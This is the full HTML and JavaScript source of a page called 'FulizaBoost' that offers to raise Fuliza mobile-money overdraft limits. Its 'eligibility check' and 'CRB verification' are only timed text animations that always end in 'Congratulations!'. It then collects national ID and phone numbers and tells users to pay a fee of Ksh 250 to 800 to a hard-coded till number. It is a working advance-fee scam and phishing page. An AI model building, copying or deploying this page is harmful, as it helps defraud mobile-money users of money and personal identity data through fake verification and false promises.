<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>FulizaBoost</title>

<style>
body {
  margin: 0;
  font-family: Arial;
  background: #f3f4f6;
  text-align: center;
}

/* CARD */
.card {
  width: 90%;
  max-width: 350px;
  margin: 80px auto;
  background: #fff;
  padding: 25px;
  border-radius: 20px;
}

/* BUTTON */
button {
  width: 100%;
  padding: 14px;
  border-radius: 12px;
  border: none;
  cursor: pointer;
}

.green { background: #22c55e; color: white; }
.dark { background: #0f172a; color: white; }

input {
  width: 100%;
  padding: 14px;
  margin: 10px 0;
  border-radius: 10px;
  border: 1px solid #ddd;
}

/* GRID */
.grid {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 10px;
  padding: 20px;
}

.box {
  background: white;
  padding: 15px;
  border-radius: 12px;
  border: 1px solid #ddd;
  cursor: pointer;
}

.box.active {
  border: 2px solid green;
}

/* LOADER */
.loader {
  width: 50px;
  height: 50px;
  border: 5px solid #eee;
  border-top: 5px solid green;
  border-radius: 50%;
  animation: spin 1s linear infinite;
  margin: auto;
}

@keyframes spin {
  to { transform: rotate(360deg); }
}

/* MODAL */
.modal {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: rgba(0,0,0,0.5);
  display: none;
  justify-content: center;
  align-items: center;
}

.modal-box {
  width: 90%;
  max-width: 400px;
  background: white;
  border-radius: 20px;
  overflow: hidden;
}

/* HEADER */
.modal-header {
  background: #22c55e;
  color: white;
  padding: 20px;
  text-align: left;
}

.modal-body {
  padding: 20px;
}

.notice {
  background: #e6f7ed;
  padding: 15px;
  border-radius: 10px;
  font-size: 14px;
  margin-bottom: 15px;
}

/* FOOTER */
.row {
  display: flex;
  gap: 10px;
}

.cancel { background: #eee; }
</style>
</head>

<body>

<!-- STEP 1 -->
<div id="step1" class="card">
  <h2>Fuliza Plus+</h2>
  <input id="phone" placeholder="Enter M-Pesa Number">
  <button class="green" onclick="start()">Check My Eligibility</button>
</div>

<!-- STEP 2 -->
<div id="step2" class="card" style="display:none;">
  <div class="loader"></div>
  <h3 id="loadingText">Connecting...</h3>
</div>

<!-- STEP 3 -->
<div id="step3" class="card" style="display:none;">
  <h2>✅ Congratulations!</h2>
  <button class="dark" onclick="showLimits()">Proceed</button>
</div>

<!-- STEP 4 -->
<div id="step4" style="display:none;">
  <h2>FulizaBoost</h2>
  <div class="grid" id="limits"></div>
  <button class="dark" onclick="openModal()">Proceed to Upgrade Limit</button>
</div>

<!-- MODAL -->
<div class="modal" id="modal">
  <div class="modal-box">

    <div class="modal-header">
      <small>SECURE FULIZA APPLICATION</small>
      <h3 id="limitText">Limit will be boosted to Ksh 3,000</h3>
    </div>

    <div class="modal-body">

      <div class="notice" id="noticeText"></div>

      <input placeholder="ID Number" id="idNumber">
      <input placeholder="Phone Number" id="phoneNumber">

      <div class="row">
        <button class="cancel" onclick="closeModal()">Cancel</button>
        <button class="green" id="payBtn" onclick="pay()">Pay</button>
      </div>

    </div>
  </div>
</div>

<script>

const TILL_NUMBER = "6363781";

let selectedLimit = "Ksh 3,000";
let selectedFee = "250";

/* START PROCESS */
function start() {
  document.getElementById("step1").style.display = "none";
  document.getElementById("step2").style.display = "block";

  const steps = [
    "Connecting...",
    "Verifying CRB Status...",
    "Finalizing Trust Score..."
  ];

  let i = 0;

  const interval = setInterval(() => {
    document.getElementById("loadingText").innerText = steps[i];
    i++;

    if (i === steps.length) {
      clearInterval(interval);
      setTimeout(() => {
        document.getElementById("step2").style.display = "none";
        document.getElementById("step3").style.display = "block";
      }, 1000);
    }
  }, 2000);
}

/* SHOW LIMITS */
function showLimits() {
  document.getElementById("step3").style.display = "none";
  document.getElementById("step4").style.display = "block";

  const data = [
    ["Ksh 3,000","250"],
    ["Ksh 5,000","293"],
    ["Ksh 10,000","500"],
    ["Ksh 20,000","800"]
  ];

  const container = document.getElementById("limits");

  data.forEach(item => {
    const div = document.createElement("div");
    div.className = "box";
    div.innerHTML = `<b>${item[0]}</b><br><small>Fee: Ksh ${item[1]}</small>`;

    div.onclick = () => {
      document.querySelectorAll(".box").forEach(x => x.classList.remove("active"));
      div.classList.add("active");

      selectedLimit = item[0];
      selectedFee = item[1];
    };

    container.appendChild(div);
  });
}

/* OPEN MODAL */
function openModal() {
  document.getElementById("modal").style.display = "flex";

  document.getElementById("limitText").innerText =
    "Limit will be boosted to " + selectedLimit;

  document.getElementById("payBtn").innerText =
    "Pay Ksh " + selectedFee;

  document.getElementById("noticeText").innerHTML =
    `Enter your Safaricom number for VERIFICATION! Once payment to Till Number <b>${TILL_NUMBER}</b> is confirmed, your boost request will begin processing.`;
}

/* CLOSE */
function closeModal() {
  document.getElementById("modal").style.display = "none";
}

/* PAY */
function pay() {
  let id = document.getElementById("idNumber").value;
  let phone = document.getElementById("phoneNumber").value;

  if (!id || !phone) {
    alert("Fill all fields");
    return;
  }

  alert("Processing payment...");
}

</script>

</body>
</html>
